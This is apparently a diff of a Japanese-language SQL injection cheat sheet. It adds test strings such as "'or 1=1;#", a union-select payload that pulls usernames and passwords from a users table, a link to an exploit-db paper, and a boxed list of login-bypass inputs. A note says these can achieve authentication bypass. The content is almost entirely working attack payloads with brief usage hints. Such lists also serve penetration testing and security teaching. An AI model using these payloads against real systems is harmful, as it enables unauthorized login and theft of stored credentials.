@@ -4,9 +4,12 @@
 
 ```
 'or 1=1;#
+'
 ```
 
-* 
+※システムエラー画面に遷移したら脆弱性と判断して問題ない
+
+* 1行のみ表示
 
 ```
 'or 1=1 LIMIT 1;#
@@ -60,3 +63,37 @@
 'or 1=1 union all select 1, username, password from users;#
 ```
 
+
+
+#### SQL実行できるかの確認
+
+SQLの構造を推定しながら複数文字ためしていく(DBに合わせてMSSQL Injection PWNageなどの検索で見つける)
+
+https://www.exploit-db.com/papers/12975
+
+↑ほかにもSQLに関するたくさんのことが書いてありかなり有益なサイト
+
+```
+	+-----------------------------+
+	|	  ' or 1=1 --	      |
+	|	  a' or 1=1 --	      |
+	|	  " or 1=1 --	      |
+	|	  a" or 1=1 --	      |
+	|	  ' or 1=1 #	      |
+	|	  " or 1=1 #	      |
+	|	  or 1=1 --	      |
+	|	  ' or 'x'='x	      |
+	|	  " or "x"="x	      |
+	|	  ') or ('x'='x	      |
+	|	  ") or ("x"="x	      |
+	| ' or username LIKE '%admin% |
+	+-----------------------------+
+	|      USERNAME:  ' or 1/*    |
+	|      PASSWORD:  */ =1 --    |
+	+-----------------------------+
+	|  USERNAME: admin' or 'a'='a |
+	|  PASSWORD: '#		      |
+	+-----------------------------+
+```
+
+SQLが上記のサンプルコードで刺さればAuthentication bypassをすることも可能な場合もある
